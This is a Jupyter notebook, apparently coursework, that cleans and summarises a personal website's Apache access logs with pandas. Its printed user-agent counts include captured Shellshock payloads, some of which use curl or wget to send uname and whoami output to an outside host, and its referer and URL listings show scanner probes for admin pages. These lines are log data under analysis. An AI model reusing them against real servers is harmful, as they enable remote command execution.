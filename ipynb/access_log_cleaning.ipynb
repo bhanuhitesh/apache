{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Convert csv to DF & drop unnecessary columns/items (127.0.0.1)\n",
    "# Do some math"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import numpy as np"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "#all_logs.csv generated at the command line.\n",
    "all_logs = pd.read_csv('/home/spinster/bootcamp/homework/apache/infiles/access.csv')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "#create dataframe for data manipulation\n",
    "all_logs_df = pd.DataFrame(all_logs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>ip</th>\n",
       "      <th>DateTime</th>\n",
       "      <th>TimeZone</th>\n",
       "      <th>Method</th>\n",
       "      <th>URL</th>\n",
       "      <th>ResponseCode</th>\n",
       "      <th>BytesSent</th>\n",
       "      <th>Referer</th>\n",
       "      <th>UserAgent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:25</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/phpmyadmin/</td>\n",
       "      <td>404</td>\n",
       "      <td>220</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:25</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/PMA/</td>\n",
       "      <td>404</td>\n",
       "      <td>219</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:25</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/dbadmin/</td>\n",
       "      <td>404</td>\n",
       "      <td>219</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:26</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/pma/</td>\n",
       "      <td>404</td>\n",
       "      <td>219</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:26</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/db/</td>\n",
       "      <td>404</td>\n",
       "      <td>219</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "              ip             DateTime  TimeZone Method  \\\n",
       "14  62.170.2.205  2018-04-08 07:19:25  GMT-0700   HEAD   \n",
       "15  62.170.2.205  2018-04-08 07:19:25  GMT-0700   HEAD   \n",
       "16  62.170.2.205  2018-04-08 07:19:25  GMT-0700   HEAD   \n",
       "17  62.170.2.205  2018-04-08 07:19:26  GMT-0700   HEAD   \n",
       "18  62.170.2.205  2018-04-08 07:19:26  GMT-0700   HEAD   \n",
       "\n",
       "                                     URL ResponseCode BytesSent Referer  \\\n",
       "14  http://198.27.242.168:80/phpmyadmin/          404       220       -   \n",
       "15         http://198.27.242.168:80/PMA/          404       219       -   \n",
       "16     http://198.27.242.168:80/dbadmin/          404       219       -   \n",
       "17         http://198.27.242.168:80/pma/          404       219       -   \n",
       "18          http://198.27.242.168:80/db/          404       219       -   \n",
       "\n",
       "                                            UserAgent  \n",
       "14  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  \n",
       "15  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  \n",
       "16  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  \n",
       "17  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  \n",
       "18  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  "
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_logs_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "36027"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(all_logs_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "#drop dummy connections\n",
    "all_logs_df = all_logs_df[all_logs_df.Host != '127.0.0.1']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "35189"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#hits minus dummy connection\n",
    "len(all_logs_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "#drop my home IP\n",
    "all_logs_df = all_logs_df[all_logs_df.Host != '10.13.2.1']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "30697"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# hits minus nostalgia\n",
    "len(all_logs_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "#drop weird columns generated by cat *.csv > all_logs.csv\n",
    "all_logs_df = all_logs_df.drop(['Log Name'], axis=1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>ip</th>\n",
       "      <th>DateTime</th>\n",
       "      <th>TimeZone</th>\n",
       "      <th>Method</th>\n",
       "      <th>URL</th>\n",
       "      <th>ResponseCode</th>\n",
       "      <th>BytesSent</th>\n",
       "      <th>Referer</th>\n",
       "      <th>UserAgent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:25</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/phpmyadmin/</td>\n",
       "      <td>404</td>\n",
       "      <td>220</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:25</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/PMA/</td>\n",
       "      <td>404</td>\n",
       "      <td>219</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:25</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/dbadmin/</td>\n",
       "      <td>404</td>\n",
       "      <td>219</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:26</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/pma/</td>\n",
       "      <td>404</td>\n",
       "      <td>219</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:26</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/db/</td>\n",
       "      <td>404</td>\n",
       "      <td>219</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "              ip             DateTime  TimeZone Method  \\\n",
       "14  62.170.2.205  2018-04-08 07:19:25  GMT-0700   HEAD   \n",
       "15  62.170.2.205  2018-04-08 07:19:25  GMT-0700   HEAD   \n",
       "16  62.170.2.205  2018-04-08 07:19:25  GMT-0700   HEAD   \n",
       "17  62.170.2.205  2018-04-08 07:19:26  GMT-0700   HEAD   \n",
       "18  62.170.2.205  2018-04-08 07:19:26  GMT-0700   HEAD   \n",
       "\n",
       "                                     URL ResponseCode BytesSent Referer  \\\n",
       "14  http://198.27.242.168:80/phpmyadmin/          404       220       -   \n",
       "15         http://198.27.242.168:80/PMA/          404       219       -   \n",
       "16     http://198.27.242.168:80/dbadmin/          404       219       -   \n",
       "17         http://198.27.242.168:80/pma/          404       219       -   \n",
       "18          http://198.27.242.168:80/db/          404       219       -   \n",
       "\n",
       "                                            UserAgent  \n",
       "14  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  \n",
       "15  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  \n",
       "16  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  \n",
       "17  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  \n",
       "18  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  "
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_logs_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "# all IP addresses that were used for API calls\n",
    "ips = all_logs_df['Host']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Change 'Host' to IP to use for key in database\n",
    "all_logs_df.columns = ['ip', 'DateTime', 'TimeZone','Method','URL','ResponseCode','BytesSent','Referer','UserAgent']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>ip</th>\n",
       "      <th>DateTime</th>\n",
       "      <th>TimeZone</th>\n",
       "      <th>Method</th>\n",
       "      <th>URL</th>\n",
       "      <th>ResponseCode</th>\n",
       "      <th>BytesSent</th>\n",
       "      <th>Referer</th>\n",
       "      <th>UserAgent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:25</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/phpmyadmin/</td>\n",
       "      <td>404</td>\n",
       "      <td>220</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:25</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/PMA/</td>\n",
       "      <td>404</td>\n",
       "      <td>219</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:25</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/dbadmin/</td>\n",
       "      <td>404</td>\n",
       "      <td>219</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:26</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/pma/</td>\n",
       "      <td>404</td>\n",
       "      <td>219</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>62.170.2.205</td>\n",
       "      <td>2018-04-08 07:19:26</td>\n",
       "      <td>GMT-0700</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>http://198.27.242.168:80/db/</td>\n",
       "      <td>404</td>\n",
       "      <td>219</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "              ip             DateTime  TimeZone Method  \\\n",
       "14  62.170.2.205  2018-04-08 07:19:25  GMT-0700   HEAD   \n",
       "15  62.170.2.205  2018-04-08 07:19:25  GMT-0700   HEAD   \n",
       "16  62.170.2.205  2018-04-08 07:19:25  GMT-0700   HEAD   \n",
       "17  62.170.2.205  2018-04-08 07:19:26  GMT-0700   HEAD   \n",
       "18  62.170.2.205  2018-04-08 07:19:26  GMT-0700   HEAD   \n",
       "\n",
       "                                     URL ResponseCode BytesSent Referer  \\\n",
       "14  http://198.27.242.168:80/phpmyadmin/          404       220       -   \n",
       "15         http://198.27.242.168:80/PMA/          404       219       -   \n",
       "16     http://198.27.242.168:80/dbadmin/          404       219       -   \n",
       "17         http://198.27.242.168:80/pma/          404       219       -   \n",
       "18          http://198.27.242.168:80/db/          404       219       -   \n",
       "\n",
       "                                            UserAgent  \n",
       "14  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  \n",
       "15  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  \n",
       "16  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  \n",
       "17  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  \n",
       "18  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...  "
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_logs_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_logs_df = all_logs_df.dropna(how='any', axis = 0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "30694"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(all_logs_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "Int64Index: 30694 entries, 14 to 36016\n",
      "Data columns (total 9 columns):\n",
      "ip              30694 non-null object\n",
      "DateTime        30694 non-null object\n",
      "TimeZone        30694 non-null object\n",
      "Method          30694 non-null object\n",
      "URL             30694 non-null object\n",
      "ResponseCode    30694 non-null object\n",
      "BytesSent       30694 non-null object\n",
      "Referer         30694 non-null object\n",
      "UserAgent       30694 non-null object\n",
      "dtypes: object(9)\n",
      "memory usage: 2.3+ MB\n"
     ]
    }
   ],
   "source": [
    "all_logs_df.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "#export to csv to create database in new notebook\n",
    "all_logs_df.to_csv('/home/spinster/bootcamp/homework/apache/infiles/cleaned_access_logs.csv', sep=',', header=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Unique hosts\n",
    "unique_ips = all_logs_df['ip'].unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "7654"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# number of unique hosts\n",
    "len(unique_ips)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [],
   "source": [
    "ips_list = unique_ips.tolist()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "#print(ips_list)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "GET         28608\n",
      "HEAD         1715\n",
      "POST          233\n",
      "OPTIONS        51\n",
      "CONNECT        51\n",
      "PROPFIND       21\n",
      "OPTION          6\n",
      "PUT             6\n",
      "Method          2\n",
      "DELETE          1\n",
      "Name: Method, dtype: int64\n"
     ]
    }
   ],
   "source": [
    "# count methods used\n",
    "methods = all_logs_df['Method'].value_counts()\n",
    "print(methods)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "200              15720\n",
      "404              14357\n",
      "304                209\n",
      "400                184\n",
      "408                100\n",
      "405                 76\n",
      "206                 32\n",
      "403                  6\n",
      "501                  6\n",
      "Response Code        2\n",
      "416                  2\n",
      "Name: ResponseCode, dtype: int64\n"
     ]
    }
   ],
   "source": [
    "# count response codes\n",
    "response_codes = all_logs_df['ResponseCode'].value_counts()\n",
    "print(response_codes)\n",
    "# this looks weird, but we're primarily interested in 200, 403, and 404"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-                                                                                                                                                     19574\n",
      "http://spinster.org/                                                                                                                                   3294\n",
      "http://spinster.org                                                                                                                                    2980\n",
      "http://google.com                                                                                                                                      1102\n",
      "http://google.com/search?q=2+guys+1+horse                                                                                                               464\n",
      "http://spinster.org/elim_contents/album.old/album/2002/peeps/                                                                                           158\n",
      "http://www.spinster.org/                                                                                                                                130\n",
      "http://www.spinster.org                                                                                                                                 129\n",
      "http://spinster.org/elim_contents/photos/index.html                                                                                                     118\n",
      "http://spinster.org/elim_contents/photos/                                                                                                               110\n",
      "http://spinster.org/elim_contents/album.old/album/5000/                                                                                                 101\n",
      "http://spinster.org/elim_contents/old_modeling/non_working_portfolio/20050514/                                                                           98\n",
      "http://spinster.org/elim_contents/girl_in_green/photos.html                                                                                              60\n",
      "http://spinster.org/robots.txt                                                                                                                           57\n",
      "http://spinster.org/ramble/index.php                                                                                                                     57\n",
      "http://www.ilxor.com/ILX/ThreadSelectedControllerServlet?action=showall&boardid=40&threadid=23687                                                        57\n",
      "http://spinster.org/elim_contents/my_photos/                                                                                                             52\n",
      "http://spinster.org/elim_contents/old_modeling/portfolio/                                                                                                46\n",
      "http://spinster.org/elim_contents/old_modeling/working_portfolio/                                                                                        46\n",
      "http://www.baidu.com/s?wd=Deletedinode31337haszerodtimeFIXED!                                                                                            42\n",
      "http://spinster.org/elim_contents/                                                                                                                       42\n",
      "http://digitalflock.org                                                                                                                                  37\n",
      "http://spinster.org/elim_contents/zoran_took_photos/                                                                                                     34\n",
      "http://spinster.org/ramble/index.php?blogId=12                                                                                                           33\n",
      "http://search.daum.net/                                                                                                                                  30\n",
      "http://www.shigeton.com/baken/2007_ura/wins.cgi?mode=user_list                                                                                           30\n",
      "http://spinster.org/ramble/index.php?blogId=57                                                                                                           28\n",
      "http://spinster.org/wp-login.php                                                                                                                         28\n",
      "http://digitalflock.org/                                                                                                                                 27\n",
      "http://burger-imperia.com/                                                                                                                               24\n",
      "                                                                                                                                                      ...  \n",
      "http://whois.domaintools.com/spinster.org                                                                                                                 1\n",
      "http://www.local.com/results/?keyword=lincare%20reachers%20grabers&location=Brattleboro%252C%2520VT                                                       1\n",
      "http://198.27.242.168//s.php                                                                                                                              1\n",
      "http://search.daum.net                                                                                                                                    1\n",
      "http://www.sneakerkopenonline.nl                                                                                                                          1\n",
      "http://FARBPROM.ORG                                                                                                                                       1\n",
      "www.paschernikemax.fr                                                                                                                                     1\n",
      "http://spinspot.org                                                                                                                                       1\n",
      "http://realnye-otzyvy.info/                                                                                                                               1\n",
      "http://www.spinster.org/about.htm                                                                                                                         1\n",
      "http://spinster.org/elim_contents/boot_camp/                                                                                                              1\n",
      "http://spinster.org/elim_contents/old_stuff/phone_pix/sunshine-foot_cartoon.jpg                                                                           1\n",
      "http://POEG.ORG                                                                                                                                           1\n",
      "http://lawgibb.com/tags/                                                                                                                                  1\n",
      "http://spinster.org/index.php?option=com_user&view=register                                                                                               1\n",
      "http://digitalflock.org/~kieran/pics/0227.JPG                                                                                                             1\n",
      "Connection: close;                                                                                                                                        1\n",
      "http://spinster.org/bitrix/admin/                                                                                                                         1\n",
      "http://spinster.org/ramble/index.php?blogId=43+%3Estephanie+mcmahon+measurements%3C/a%3E+from+side.+Her+body+and+tee.%3C/span%3E%3Cbr%3E2009-05-14        1\n",
      "http://198.27.242.168//sheep.php                                                                                                                          1\n",
      "http://www.baidu.com/s?wd=OM7                                                                                                                             1\n",
      "http://spinster.org/ramble/index.php?blogid=24                                                                                                            1\n",
      "http://spinster.org/elim_contents/photos/15.html                                                                                                          1\n",
      "http://digitalflare.org                                                                                                                                   1\n",
      "http://DIGITALFLOCK.ORG                                                                                                                                   1\n",
      "http://www.spinster.org/contact.html                                                                                                                      1\n",
      "http://spinster.org/?q=user                                                                                                                               1\n",
      "http://DIGITALFLOCK.org/editor/filemanager/upload/php/upload.php                                                                                          1\n",
      "http://sistema-anoat.blogspot.pe/2005_12_01_archive.html                                                                                                  1\n",
      "http://digitalflock.org/?param1=phpinfo&param2=123                                                                                                        1\n",
      "Name: Referer, Length: 547, dtype: int64\n"
     ]
    }
   ],
   "source": [
    "# look for unique referers\n",
    "referer = all_logs_df['Referer'].value_counts()\n",
    "print(referer)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "547"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(referer)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-                                                                                                                                                                                                              4010\n",
      "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)                                                                                                                                       1013\n",
      "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)                                                                                                                     1006\n",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36                                                                                        883\n",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6                                                                                           748\n",
      "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)                                                                                                                                         719\n",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)                                                                                                                                 715\n",
      "Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)                                                                                                                                                  571\n",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko                                                                                                                                            525\n",
      "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)                                                                                                                                         445\n",
      "() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`                                                                                                                               430\n",
      "() { goo;}; echo Content-Type: text/plain ; echo ; echo fuck`id`                                                                                                                                                430\n",
      "NerdyBot                                                                                                                                                                                                        372\n",
      "() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`                                                                                                                                     344\n",
      "() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`                                                                                                                               325\n",
      "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)                                                                                                                             287\n",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0                                                                                                                                        280\n",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0                                                                                                                                        276\n",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36                                                                                        261\n",
      "MauiBot (crawler.feedback+wc@gmail.com)                                                                                                                                                                         247\n",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0 AlexaToolbar/alxf-2.21                                                                                                                 245\n",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36                                                                                             239\n",
      "Python-urllib/2.7                                                                                                                                                                                               220\n",
      "Mozilla/5.0 (Linux; Android 8.0.0; moto x4 Build/OPWS27.57-25-6-6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36                                                             215\n",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0                                                                                                                                        209\n",
      "Mozilla/5.0 Jorgee                                                                                                                                                                                              202\n",
      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.4.600 Chrome/30.0.1599.101 Safari/537.36                                                                                 200\n",
      "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)                                                                                                                                                         177\n",
      "ZmEu                                                                                                                                                                                                            176\n",
      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36                                                                                                   173\n",
      "                                                                                                                                                                                                               ... \n",
      "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.25 (KHTML, like Gecko) Chrome/12.0.706.0 Safari/534.25                                                                                                               1\n",
      "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36                                                                                                    1\n",
      "Googlebot (gocrawl v0.4)                                                                                                                                                                                          1\n",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7                                                                                              1\n",
